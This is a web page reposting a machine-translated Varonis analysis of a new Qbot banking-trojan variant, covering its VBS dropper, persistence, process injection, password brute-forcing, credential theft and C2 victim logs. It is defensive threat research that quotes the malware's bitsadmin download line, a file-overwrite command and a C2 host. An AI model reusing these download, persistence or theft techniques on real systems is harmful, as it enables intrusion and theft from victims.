<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Qbot is back. Varonis presented a detailed analysis of the Qbot banking trojan</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="The security research team Varonis has discovered and researched 
 global cyber attack using a new malware strain 
 ensure qbot. The campaign actively...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Qbot is back. Varonis presented a detailed analysis of the Qbot banking trojan</h1><div class="post__text post__text-html js-mediator-article">  The security research team Varonis has discovered and researched <br>  global cyber attack using a new malware strain <br>  ensure qbot.  The campaign actively targets US corporations, but hit networks around the world ‚Äî with victims across Europe, Asia, Russia, and South America ‚Äî to steal confidential financial information, including bank account credentials. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/eg/hg/lp/eghglp-mgqj0m81re6m6jgxf6qw.jpeg"></div><a name="habracut"></a><br>  During the analysis, we analyzed the code of this Qbot variant and identified the working command control center of the attack, which allowed us to determine the scale of the infection.  Direct observations of the C2 server revealed that thousands of victims around the world have already been compromised and are under the active control of intruders.  Additional information found on the C &amp; C server also revealed traces of the direct participants behind this campaign. <br><br>  The attack was originally detected by <a href="https://sites.varonis.com/ru/products/datalert/">Varonis DatAlert</a> , in one of our <br>  North American customers.  Varonis DatAlert warned about downloading suspicious software, moving inside the security perimeter (internal lateral movement) and suspicious network activity. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      Our team is currently actively cooperating with the authorities investigating this incident, and gave them additional non-public information.  In this article we will share the information allowed for disclosure. <br><br><h2>  The new version of Qbot banking malware </h2><br>  The operators of this malicious campaign used a new kind of Qbot, a well-known and sophisticated malware designed to steal bank credentials.  Qbot uses advanced anti-analysis techniques, often shies away from detection, and uses new infection vectors to outperform existing protective measures. <br><br>  The malicious program is polymorphic and constantly changes itself: <br><br><ul><li>  it creates files and folders with random names </li><li>  its update loader often changes the C2 server </li><li>  the malware loader changes if there is an active internet connection (more on this later) </li></ul><br>  Qbot (or Qakbot) was first identified in 2009 and has evolved significantly since then.  It is primarily intended to collect data from Internet networking sessions and data related to financial websites.  Its worm's network capabilities allow it to spread across an organization's network and infect other systems. <br><br><h2>  Detection </h2><br>  Our team began an investigation after a customer call, where DatAlert already deployed warned about suspicious activity in its systems.  The investigation revealed that, <br>  At least one computer is infected with malware, and attempts to spread to other servers on the network have been identified. <br><br>  A sample of the worm was extracted and sent to the Varonis research team for analysis.  The sample did not match any existing hashes, and further research revealed that it was a new strain. <br><br><h2>  First stage: dropper </h2><br>  File Name: REQ_02132019b.doc.vbs <br><br><img src="https://habrastorage.org/webt/7_/sv/m_/7_svm_nsw3lze8vffh6loq87bvk.png"><br><br>  In previous versions of Qbot, a macro was launched on the victim‚Äôs computer inside a Word document.  During our investigation, a zip file with the .doc.vbs extension was also found, indicating that the initial infection was probably implemented through <br>  the phishing email from which the malicious VBS (Visual Basic Script) script was launched. <br><br>  After executing, VBS identifies the operating system version of the victim's machine and attempts to detect installed anti-virus software.  The malicious program is looking for the following lines: Defender, Virus, Antivirus, Malw, Trend, Kaspersky, Kav, McAfee, Symantec. <br><br>  In the new version, the malware uses <a href="https://docs.microsoft.com/en-us/windows/desktop/bits/bitsadmin-tool">BITSAdmin</a> to download the bootloader.  This is a new behavior, as in previous versions of malware, PowerShell was used. <br><br>  BITSAdmin downloads a bootloader from one of the following sites: <br><br><img src="https://habrastorage.org/webt/6e/ch/oe/6echoe9sgeheylwtvxsc5igaub0.png"><br><br>  And here is the VBS code for downloading the bootloader using BITSAdmin: <br><br><pre><code class="plaintext hljs">intReturn = wShell.Run ('bitsadmin / transfer qahdejob' &amp; Second (Now) &amp; '/ Priority HIGH '&amp; el &amp; urlStr ' ' &amp; tempFile, 0, True)</code> </pre> <br><h2>  <b>The second stage: to gain a foothold and penetrate into explorer.exe</b> </h2><br>  File Name: widgetcontrol.png <br><br><img src="https://habrastorage.org/webt/7_/sv/m_/7_svm_nsw3lze8vffh6loq87bvk.png"><br><br>  The loader, which contains the malware kernel, has several versions and is constantly updated even after execution.  The version that the victim receives during the infection depends on the <i>sp</i> parameter, which is hard-coded in the VBS file. <br><br>  A peculiarity of the malware is that each version of the bootloader is signed by different digital certificates.  Trusted certificates usually show that the file is trusted, while unsigned executable files are suspicious. <br><br>  Qbot is known to use fake or stolen valid digital certificates to gain credibility and avoid detection in the operating system. <br><br>  We downloaded all available bootloader versions (see the compromise indicators below) and compared the certificates. <br><br>  <b>Certificates used by malware:</b> <br><br><ul><li>  Saiitech Systems Limited </li><li>  Ecdjb limited </li><li>  Hitish Patel Consulting Ltd </li><li>  Doorga Limited </li><li>  INTENTEK LIMITED </li><li>  Austek Consulting Limited </li><li>  IO Pro Limited </li><li>  Vercoe IT Ltd </li><li>  Edsabame Consultants Ltd </li><li>  SOVA CONSULTANCY LTD </li></ul><br>  <b>An example of one of the certificates:</b> <br><br><img src="https://habrastorage.org/webt/ak/03/wd/ak03wdaoe8y68acfcuymz3ddup8.png"><br><br><h3>  <b>Fastening</b> </h3><br>  When first started, the bootloader copies itself to% Appdata% \ Roaming \ {Random string} and then creates the following: <br><ul><li>  <b>Register:</b> writes itself to a well-known registry key for execution when a user logs in: <br><br>  HKEY_CURRENT_USER \ Software \ Microsoft \ Windows \ CurrentVersion \ Run </li><li>  <b>Task Scheduler:</b> a task is created to launch malware every 5 hours from the path specified below. <br>  % Appdata% \ Roaming \ Microsoft \ {Randomized String} </li><li>  <b>Startup:</b> Qbot creates a shortcut in the Startup user directory for autorun. </li></ul><br><br><h3>  <b>Infected Explorer.exe</b> </h3><br>  The loader starts the 32-bit explorer process of explorer.exe, and then injects into it <br>  main payloads. <br><br>  Here is a dump of the explorer.exe process with the payload already installed in the form of a RWX memory segment: <br><br><img src="https://habrastorage.org/webt/1w/w3/eb/1ww3ebpmwpwxesnekir2detqvxo.png"><br><br>  After implementation, the loader overwrites its original executable file with a 32-bit version of calc.exe: <br><br>  "C: \ Windows \ System32 \ cmd.exe" / c ping.exe-N 6 127.0.0.1 &amp; type "C: \ Windows \ System32 \ calc.exe"&gt; C: \ Users \ {TKTKTK} \ Desktop \ 1 .exe <br><br><h2>  <b>Third Stage: quietly sneak up and steal money</b> </h2><br>  After being fixed in the system, the brutfors module begins to sort through passwords and accounts over the network.  If the malware got to compromise a domain account, then it reads the list of users of the Domain Users group and starts sorting through these accounts.  If a local account is compromised, the malware uses a standard predefined list of local users.  Authentication attempts use NTLM and the WNetAddConnection API. <br><br>  We extracted usernames and passwords used by the malware when trying to iterate through local accounts ( <a href="https://github.com/varonis/qbot-analysis/blob/master/brute-force-dictionary.txt">here</a> ).  The malware hides these dictionaries from static analysis, but they can be retrieved at runtime. <br><br>  X32dbg Explorer image explorer.exe, which tries to connect to a remote computer with the user "Administrator" and the password "12345678": <br><br><img src="https://habrastorage.org/webt/co/sn/iu/cosniu9q3xin4fjj5w1blhjuhhw.png"><br><br><h3>  <b>Carry your money</b> </h3><br>  The main goal of Qbot is to steal money from its victims;  he uses several methods to steal financial, accounting and other information and send it to the attacker's server: <br><br><ul><li>  Keylogger - Qbot captures and sends each keystroke that the victim enters, and downloads them to the attacker </li><li>  Credentials / session cookies - Qbot searches for saved credentials / cookies from browsers and sends them to the attacker </li><li>  Overhearing - the malware payload is injected into all processes in the system with code that intercepts API calls and searches for financial / bank lines, credentials or session data from the process and loads them to the attacker. </li></ul><br>  The figure below shows that when authenticating on the bank‚Äôs website buisnessline.huntington.com, the malware sends POST request data and session cookies to the C2 server content.bigflimz.com: <br><br><img src="https://habrastorage.org/webt/nf/fn/4f/nffn4foeopdjhbdzkfsasez0vwi.png"><br><br><h2>  <b>Inside the attacker's C2 server</b> </h2><br>  At one of the attacker's sites, we were able to find log files containing the IP addresses of the victims, information about the operating system, and the names of the anti-virus products.  Server C2 showed information on past attacks, as well as additional versions of malware (version table in the section ‚ÄúCompromising Indicators‚Äù below). <br><br><img src="https://habrastorage.org/webt/tf/rp/wz/tfrpwzx45qycmrywkizrhry5iaa.png"><br><br>  Some results may contain duplicates, but below are the top 10 countries, anti-virus products and operating systems found.  It is also known that the victims of the attack were large financial organizations in Russia. <br><br>  All data is posted in our <a href="https://github.com/varonis/qbot-analysis/blob/master/brute-force-dictionary.txt">Github repository</a> . <br><br>  We found 2 726 unique victims IP addresses.  Since many organizations use NAT address translation, which masks internal IP addresses, the number of victims, <br>  likely to be much more. <br><br><img src="https://habrastorage.org/webt/w1/ry/oe/w1ryoet4hg6ivu6hbh_-dodqaag.png" alt="Victims by country" align="left"><br>  <i>Figure: Victims by country</i> <br><br><img src="https://habrastorage.org/webt/co/7f/cf/co7fcfsxpr7ymrj_uhptwnx32ts.png" alt="Victims by operating system" align="left"><br>  <i>Figure: Victims by operating system</i> <br><br><img src="https://habrastorage.org/webt/sx/yo/km/sxyokme-8i6f7croamzgfaprphm.png" alt="Victims by antivirus used" align="left"><br>  <i>Figure: Victims by Antivirus Used</i> <br><br><h2>  <b>Compromise Indicators</b> </h2><br>  All indicators of compromise can be found on Github <a href="https://github.com/varonis/qbot-analysis/blob/master/ioc.txt">here</a> . <br><br>  <b>Boot Loader Versions</b> <br>  Full list can be found <a href="">here</a> . </div><p>Source: <a href="https://habr.com/ru/post/450208/">https://habr.com/ru/post/450208/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../450192/index.html">Progressive scale of taxation</a></li>
<li><a href="../450194/index.html">Oops, I did it again: debug common javascript errors</a></li>
<li><a href="../450198/index.html">Evgeny Kanevsky: ‚ÄúThe state did not see a big future of small equipment‚Äù</a></li>
<li><a href="../4502/index.html">Yandex went offline for contextual advertiser</a></li>
<li><a href="../450206/index.html">Tips for novice developers</a></li>
<li><a href="../45021/index.html">Mail.ru asks to roll back to the 9th flash-player</a></li>
<li><a href="../450214/index.html">We launch inspections IntelliJ IDEA on Jenkins</a></li>
<li><a href="../450216/index.html">Holiday or weekend?</a></li>
<li><a href="../450222/index.html">5 cool digital marketing services that have not been heard in Russia</a></li>
<li><a href="../450224/index.html">Step-by-Step Guide to Creating a Voice Assistant with Python</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>